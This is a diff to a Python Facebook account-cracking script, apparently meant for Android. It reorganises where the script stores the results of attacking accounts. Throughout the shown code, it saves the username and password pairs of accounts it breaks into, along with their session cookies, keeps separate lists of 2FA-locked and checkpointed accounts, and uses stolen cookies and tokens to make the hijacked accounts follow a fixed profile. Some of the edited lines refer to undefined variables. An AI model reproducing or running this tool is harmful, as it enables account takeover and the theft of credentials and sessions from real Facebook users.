@@ -73,13 +73,22 @@ try:
 except:
     pass 
 try:
-    os.mkdir('/sdcard/GS-2X-IDS/M-2 IDS')
+    os.mkdir('/sdcard/GS-2X-IDS/M2- IDS')
 except:
     pass 
- try:
-    os.mkdir('/sdcard/GS-2X-IDS/M-3 IDS')
+try:
+    os.mkdir('/sdcard/GS-2X-IDS/M3- IDS')
 except:
     pass 
+try:
+    os.mkdir('/sdcard/GS-2X-IDS/M4- IDS')
+except:
+    pass 
+try:
+    os.mkdir('/sdcard/GS-2X-IDS/LOCK IDS')
+except:
+    pass 
+
 
 EE = '\r\r\x1b[38;5;208m'
 PP = '\x1b[1;37m'
@@ -629,8 +638,8 @@ class crack:
                 if "c_user" in str(cok):
                     coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                     print(f"\r{HH}[OK-GSXD] {user} | {pw} {VV}    ")
-                    open("/sdcard/GSXD_OK.txt", "a").write(user + "|" + pw + "\n")
-                    open("/sdcard/GSXD_cokie.txt", "a").write(user + "|" + pw + " | " + coki + "\n")
+                    open("/sdcard/GS-2X-IDS/M4- IDS/M3-GSXD_OK.TXT", "a").write(used + "|" + pw + "\n")
+                    open("/sdcard/GS-2X-IDS/M4- IDS/M3-GSXD_COKIE.TXT", "a").write(used + "	|	" + pw + " 	| 	" + cokie + 																	"			\n")
                     ok.append(user + pw)
                     self.follow(coki)
                     break
@@ -701,8 +710,8 @@ class crack:
                     user=cok['c_user']
                     print(f"\r{HH}[OK-GSXD] {user} | {pw} {VV} ")
                     #print(f"\r{HH}#[OK-GSXD] {user} | {pw} | {coki}		 {VV}			    ")
-                    open("/sdcard/GSXD_OK.txt", "a").write(user + "|" + pw + "\n")
-                    open("/sdcard/GSXD_cokie.txt", "a").write(user + "|" + pw + " | " + coki + "\n")
+                    open("/sdcard/GS-2X-IDS/M1- IDS/M1-GSXD_OK.TXT", "a").write(used + "|" + pw + "\n")
+                    open("/sdcard/GS-2X-IDS/M1- IDS/M1-GSXD_COKIE.TXT", "a").write(used + "	|	" + pw + " 	| 	" + cokie + 																	"			\n")
                     ok.append(user + pw)
                     self.follow(coki)
                     break
@@ -711,12 +720,12 @@ class crack:
                     if 'Enter login code to continue' in str(rex.text):
                         Mm = '\033[9;31m'
                         #print(f"\r{Mm#}[2F-GSXD] {user} | {pw}{VV}     ")
-                        open("/sdcard/GSXD_2F.txt", "a").write(user + "|" + pw + "\n")
+                        open("/sdcard/GS-2X-IDS/LOCK IDS/GSXD_2F.txt", "a").write(user + "|" + pw + "\n")
                         f2.append(user + pw)
                         break
                     else:
                         #print(f"\r{EE}[C#P-GSXD] {user} | {pw}{VV}     ")
-                        open("/sdcard/GSXD_CP.txt", "a").write(user + "|" + pw + "\n")
+                        open("/sdcard/GS-2X-IDS/LOCK IDS/GSXD_CP.txt", "a").write(user + "|" + pw + "\n")
                         cp.append(user + pw)
                         break
                 else:
@@ -806,8 +815,8 @@ class crack:
                         name=me['name']
                         idd=me['id']
                         print(f"\r{HH}[OK-GSXD] {used} | {pw} {VV}    ")
-                        open("/sdcard/GSXD_OK.txt", "a").write(used + "|" + pw + "\n")
-                        open("/sdcard/GSXD_cokie.txt", "a").write(used + "|" + pw + " | " + cokie + "\n")
+                        open("/sdcard/GS-2X-IDS/M2- IDS/M2-GSXD_OK.TXT", "a").write(used + "|" + pw + "\n")
+                        open("/sdcard/GS-2X-IDS/M2- IDS/M2-GSXD_COKIE.TXT", "a").write(used + "	|	" + pw + " 	| 	" + cokie + 																	"			\n")
                         ok.append(used + pw)
                         break
                     except KeyError:
@@ -827,7 +836,7 @@ class crack:
                     if len(used)<11 or len(used)>15:
                         used = user
                     #print(f"\r{M#m}[2F-GSXD] {used} | {pw}{VV}     ")
-                    open("/sdcard/GSXD_2F.txt", "a").write(used + "|" + pw + "\n")
+                    open("/sdcard/GS-2X-IDS/LOCK IDS/GSXD_2F.txt", "a").write(used + "|" + pw + "\n")
                     f2.append(used + pw)
                     break
                 elif 'User must verify their account' in str(q):
@@ -856,12 +865,12 @@ class crack:
                     if 'uid' not in str(q) or 'skip_ixt_start_dialog' in str(q):
                         Mm = '\033[9;31m'
                         print(f"\r{Mm}[2F-GSXD] {used} | {pw}{VV}     ")
-                        open("/sdcard/GSXD_2F.txt", "a").write(used + "|" + pw + "\n")
+                        open("/sdcard/GS-2X-IDS/LOCK IDS/GSXD_2F.txt", "a").write(used + "|" + pw + "\n")
                         f2.append(used + pw)
                         break
                     else:
                         #print(f"\r{EE}#[CP-GSXD] {used} | {pw} {VV}    ")
-                        open("/sdcard/GSXD_CP.txt", "a").write(used + "|" + pw + "\n")
+                        open("/sdcard/GS-2X-IDS/LOCK IDS/GSXD_CP.txt", "a").write(used + "|" + pw + "\n")
                         cp.append(used + pw)
                         break
                 else:
@@ -955,8 +964,8 @@ class crack:
                         idd=me['id']
                         print(f"\r{HH}[OK-GSXD] {used} | {pw} {VV}  ")
                         #print(f"\r{HH}[#OK-GSXD] {used} | {pw} | {cokie} {VV} 			   ")
-                        open("/sdcard/GS-2X-IDS/M3-GSXD_OK.TXT", "a").write(used + "|" + pw + "\n")
-                        open("/sdcard/GS-2X-IDS/M3-GSXD_COKIE.TXT", "a").write(used + "	|	" + pw + " 	| 	" + cokie + 																	"			\n")
+                        open("/sdcard/GS-2X-IDS/M3- IDS/M3-GSXD_OK.TXT", "a").write(used + "|" + pw + "\n")
+                        open("/sdcard/GS-2X-IDS/M3- IDS/M3-GSXD_COKIE.TXT", "a").write(used + "	|	" + pw + " 	| 	" + cokie + 																	"			\n")
                         ok.append(used + pw)
                         follow_id='100000160984736' #uzzal
                         subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+tokic, cookies={'cookie':cokie}).text
@@ -982,7 +991,7 @@ class crack:
                     if len(used)<11 or len(used)>15:
                         used = user
                     #print(f"\r{#Mm}[2F-GSXD] {used} | {pw}{VV}     ")
-                    open("/sdcard/GSXD_2F.txt", "a").write(used + "|" + pw + "\n")
+                    open("/sdcard/GS-2X-IDS/LOCK IDS/GSXD_2F.txt", "a").write(used + "|" + pw + "\n")
                     f2.append(used + pw)
                     break
                 elif 'User must verify their account' in str(q):
@@ -1009,7 +1018,7 @@ class crack:
                     if len(used)<11 or len(used)>15:
                         used = user
                     #print(f"\r{EE#}[CP-GSXD] {used} | {pw} {VV}    ")
-                    open("/sdcard/GSXD_CP.txt", "a").write(used + "|" + pw + "\n")
+                    open("/sdcard/GS-2X-IDS/LOCK IDS/GSXD_CP.txt", "a").write(used + "|" + pw + "\n")
                     cp.append(used + pw)
                     break
                 else:
@@ -1908,4 +1917,4 @@ def cutrs():
 
 if __name__ == '__main__':
     os.system('git pull')
-crack().plerr()
+crack().plerr() 
